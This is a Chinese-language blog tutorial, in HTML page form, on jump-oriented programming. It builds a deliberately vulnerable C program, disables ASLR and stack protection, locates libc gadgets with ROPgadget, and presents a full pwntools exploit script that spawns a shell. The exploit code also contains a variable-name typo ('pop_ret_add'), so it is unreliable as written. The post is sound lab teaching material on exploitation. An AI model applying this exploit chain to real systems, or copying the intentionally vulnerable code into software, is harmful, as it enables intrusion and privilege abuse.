<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Jump-oriented programming(跳转导向编程) · Abigale</title><meta name="description" content="Jump-oriented programming(跳转导向编程) - zhs"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://yoursite.com/atom.xml" title="Abigale"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://www.abigale.xin" target="_blank" class="nav-list-link">ALIYUN</a></li><li class="nav-list-item"><a href="https://github.com/o1zhs" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Jump-oriented programming(跳转导向编程)</h1><div class="post-info">Apr 11, 2018</div><div class="post-content"><h1 id="JOP攻击"><a href="#JOP攻击" class="headerlink" title="JOP攻击"></a>JOP攻击</h1><h2 id="一、JOP"><a href="#一、JOP" class="headerlink" title="一、JOP"></a>一、JOP</h2><p>​        JOP 的全称为 Jump-oriented programming（跳转导向编程）,攻击与ROP 攻击类似。它同样利用二进制可执行文件中已有的代码片段来进行攻击。ROP使用的是ret指令来改变程序的控制流，而JOP攻击利用的是程序间接接跳转和间接调用指令（间接 call 指令）来改变程序的控制流。当程序在执行间接跳转或者是间接调用指令时，程序将从指定寄存器中获得其跳转的目的地址，由于这些跳转目的地址被保在寄存器中，而攻击者又能通过修改栈中的内容来修改寄存器内容，这使得程序中间接跳转和间接调用的目的地址能被攻击者篡改。当攻击者篡改这些寄存器当中的内容时，攻击者就能够使程序跳转到攻击者所构建的 gadget地址处，进而实施 JOP攻击。</p>
<h2 id="二、进行攻击必要的环境以及工具"><a href="#二、进行攻击必要的环境以及工具" class="headerlink" title="二、进行攻击必要的环境以及工具"></a>二、进行攻击必要的环境以及工具</h2><p>​        本文采用的是Linux中的ubuntu 16.04 LTS  x64系统。其中的工具有pwntools，ROPgadget，gdb-peda。下载和安装的方式如下：</p>
<h4 id="pwntools："><a href="#pwntools：" class="headerlink" title="pwntools："></a>pwntools：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install pwn</span><br></pre></td></tr></table></figure>
<p>如果系统里没有pip，运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget:"></a>ROPgadget:</h4><p> <a href="https://github.com/JonathanSalwan/ROPgadget/tree/master" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget/tree/master</a> </p>
<p>此工具用来寻找复杂的gadget片段。</p>
<h4 id="gdb-peda"><a href="#gdb-peda" class="headerlink" title="gdb-peda:"></a>gdb-peda:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<p>如果系统里没有git，运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>
<p>如果apt install失败，请检查系统的源和网络，源在如下文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/source.list</span><br></pre></td></tr></table></figure>
<h2 id="三、预备知识"><a href="#三、预备知识" class="headerlink" title="三、预备知识"></a>三、预备知识</h2><h3 id="1、函数栈帧结构"><a href="#1、函数栈帧结构" class="headerlink" title="1、函数栈帧结构"></a>1、函数栈帧结构</h3><p>参考：<a href="https://blog.csdn.net/lqt641/article/details/73002566" target="_blank" rel="noopener">https://blog.csdn.net/lqt641/article/details/73002566</a></p>
<h3 id="2、x64架构中的函数传参"><a href="#2、x64架构中的函数传参" class="headerlink" title="2、x64架构中的函数传参"></a>2、x64架构中的函数传参</h3><p>​        在x64中前六个参数依次保存在RDI，RSI，RDX，RCX，R8和 R9寄存器里，如果还有更多的参数的话才会保存在栈上。</p>
<h3 id="3、内存中的相对地址和绝对地址"><a href="#3、内存中的相对地址和绝对地址" class="headerlink" title="3、内存中的相对地址和绝对地址"></a>3、内存中的相对地址和绝对地址</h3><p>参考：<a href="https://blog.csdn.net/prike/article/details/52722934" target="_blank" rel="noopener">https://blog.csdn.net/prike/article/details/52722934</a></p>
<h2 id="四、攻击过程"><a href="#四、攻击过程" class="headerlink" title="四、攻击过程"></a>四、攻击过程</h2><h3 id="1、攻击目的分析"><a href="#1、攻击目的分析" class="headerlink" title="1、攻击目的分析"></a>1、攻击目的分析</h3><p>​        攻击的目的是获得一个新的shell，并且拥有root权限，能够正常运行任何命令。那么正常思路就是想办法获取system()函数的地址和”/bin/sh”参数的地址，让程序能够自动执行system(“/bin/sh”)。而且Linux中有一个libc.so.6的C程序运行必要的库，里面保存了大量可利用的函数，而且包含system(“/bin/sh”)。因此我们可以利用ROPgadget工具获取我们可以利用的代码片段，通过pwntool来利用漏洞程序的漏洞，从而达到我们的攻击目的。</p>
<h3 id="2、漏洞代码分析"><a href="#2、漏洞代码分析" class="headerlink" title="2、漏洞代码分析"></a>2、漏洞代码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JOP.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearlove7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">20</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    clearlove7();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"NICE TRYN!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很容易发现这是一个有缓冲区溢出漏洞的代码，read()不会检查边界，会一直将字符读取。因此我们可以利用gdb-peda工具判断程序的溢出点。为了方便攻击，首先我们需要关闭地址空间随机化，并且编译程序时关闭栈保护：</p>
<p>关闭地址空间随机化：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>关闭栈保护：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector JOP.c -o JOP -ldl</span><br></pre></td></tr></table></figure>
<p>而且我们需要将libc.so.6二进制文件复制到与漏洞代码相同目录下，我们可以利用ldd命令查看程序是否调用了libc.so.6，并且获取其位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd JOP</span><br></pre></td></tr></table></figure>
<p>经过查看我的系统中libc.so.6位置在：/lib/x86_64-linux-gnu目录下，因此运行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /lib/x86_64-linux-gnu/libc.so.6 libc.so.6</span><br></pre></td></tr></table></figure>
<h3 id="3、程序溢出点的获取"><a href="#3、程序溢出点的获取" class="headerlink" title="3、程序溢出点的获取"></a>3、程序溢出点的获取</h3><p>​        分析得到上述程序有缓冲区溢出漏洞之后，我们便可以用gdb-peda工具进行溢出点的获取。安装好gdb-peda工具后，直接gdb可执行文件即可。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fq93o8vfooj30of086abn.jpg" alt=""></p>
<p>然后运行pattern_create 150，创建150个字符，并且在运行时输入，然后可以查看程序完成时各个寄存器的状态。</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fq93p5e745j31820den07.jpg" alt=""></p>
<p>我们可以观察RBP寄存的值，根据栈帧的结构，RBP寄存器指向地址的高8字节地址便是返回地址，而RBP中的值是”A)AAEAAa”，对应我们创建150个字符中的第33-40个字符。因此我们可以判断程序的溢出点是”A” * 40。所以我们创建payload中的第一部分就可以确定了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span></span><br></pre></td></tr></table></figure>
<h3 id="4、system-和”-bin-sh”地址的获取"><a href="#4、system-和”-bin-sh”地址的获取" class="headerlink" title="4、system()和”/bin/sh”地址的获取"></a>4、system()和”/bin/sh”地址的获取</h3><p>由于程序在运行时加载了libc.so.6，所以我们在gdb中就可以获取到system()和”/bin/sh”的地址。</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fq93pt7rlej30jt03fdgc.jpg" alt=""></p>
<p>因此可以得出，system()的地址为0x7ffff7a52390，”/bin/sh”的地址为0x7ffff7b99d57。所以我们payload中又有了一部分可以确定：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(systemaddr) + p64(binshaddr)</span><br></pre></td></tr></table></figure>
<h3 id="5、gadget的分析以及利用"><a href="#5、gadget的分析以及利用" class="headerlink" title="5、gadget的分析以及利用"></a>5、gadget的分析以及利用</h3><p>​        既然我们已经获得了system()和”/bin/sh”的地址了，那么如何调用system()函数并且其参数是”/bin/sh”呢？上面的预备知识已经提到，x64架构传参的规则：利用RDI寄存器。所以我们要想办法把”/bin/sh”的地址放到RDI里面。那么如何使机器能够执行system函数呢？在这里我的思路是利用RAX寄存器，将system()地址放到RAX里面，再寻找有jmp rax的代码片段加以利用，同时利用RDI寄存器传递参数”/bin/sh”，我们的目标就达成了，即运行system(“/bin/sh”)。</p>
<p>第一步：通过程序漏洞的溢出点，使程序跳转到能够运行将system()函数地址放到RAX寄存器代码片段，并且能够返回。这里运用了ROP的思想。所以我们利用ROPgadget工具运行以下指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &apos;libc.so.6&apos; --only &apos;pop|ret&apos; | grep rax</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fq93qabkvhj30mt02x74p.jpg" alt=""></p>
<p>利用逻辑地址0x0000000000033544处的指令即可。所以我们的payload又增添一部分：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">pop_ret_addr = <span class="number">0x0000000000033544</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(pop_ret_add) + p64(systemaddr) + p64(binshaddr)</span><br></pre></td></tr></table></figure>
<p>为什么要把pop_ret_add覆盖到systemaddr的前面呢？因为程序首先会返回到pop_ret_addr处执行gadget指令，返回之后栈顶指针会指向systemaddr，而gadget中的pop rax又会将systemaddr弹出放入rax里面，这样就达成了我们将system()函数地址放入rax中的目的。而ret指令又会将栈顶弹出，放入rip，所以下面我们要找有关pop rdi和有关jmp rax的gadget。</p>
<p>第二步：找到含有pop rdi和有关jmp rax的gadget。我们需要运行以下指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary &apos;libc.so.6&apos; --only &apos;pop|jmp&apos; | grep rax</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fq93qoep27j30n40dq41c.jpg" alt=""></p>
<p>可以很容易的找出来，0x0000000000104052处的指令有pop rdi和jmp rax。所以我们payload的最后一部分可以得到：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">pop_ret_addr = <span class="number">0x0000000000033544</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">pop_jmp_addr = <span class="number">0x0000000000104052</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(pop_ret_add) + p64(systemaddr) + p64(pop_jmp_addr) + p64(binshaddr)</span><br></pre></td></tr></table></figure>
<p>程序ret到pop_jmp_addr后，又将binshaddr弹出放入rdi，即pop rdi指令。这时，我们将system()的地址放入了rax，将”/bin/sh”的地址放入了rdi，参数和函数双全，只需要一个jmp rax就可以实现我们的攻击了。</p>
<p>所以最后的攻击程序如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">p = process(<span class="string">'./JOP'</span>)</span><br><span class="line"></span><br><span class="line">systemaddr = <span class="number">0x7ffff7a52390</span></span><br><span class="line">binshaddr = <span class="number">0x7ffff7b99d57</span></span><br><span class="line">pop_ret_addr = <span class="number">0x0000000000033544</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">pop_jmp_addr = <span class="number">0x0000000000104052</span> - libc.symbols[<span class="string">'system'</span>] + systemaddr</span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(pop_ret_add) + p64(systemaddr) + p64(pop_jmp_addr) + p64(binshaddr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里的pop_ret_addr和pop_jmp_addr需要做一下物理地址的计算，因为我们已经知道了system()的物理地址，而我们利用的gadget和system都在libc.so.6中，所以我们用libc.symbols[‘system’]得到system()的逻辑地址，并进行gadget和其偏移量的计算，最后算出pop_ret_addr和pop_jmp_addr的物理地址。</p>
<p>攻击效果：</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fq93r0j441j30nj06nq3m.jpg" alt=""></p>
<p>（本人攻击时的文件名均为ROP，读者将其改为JOP即可）</p>
<p>参考：</p>
<p><a href="http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.78e74d82WcwIGi&amp;articleid=403" target="_blank" rel="noopener">http://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.78e74d82WcwIGi&amp;articleid=403</a></p>
<p><a href="https://blog.csdn.net/alimobilesecurity/article/details/53067274" target="_blank" rel="noopener">https://blog.csdn.net/alimobilesecurity/article/details/53067274</a></p>
<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1></div></article></div></main><footer><div class="paginator"><a href="/2018/04/19/SQL练习/" class="prev">PREV</a><a href="/2018/02/11/时间复杂度--18.2.13/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2018 <a href="http://yoursite.com">zhs</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>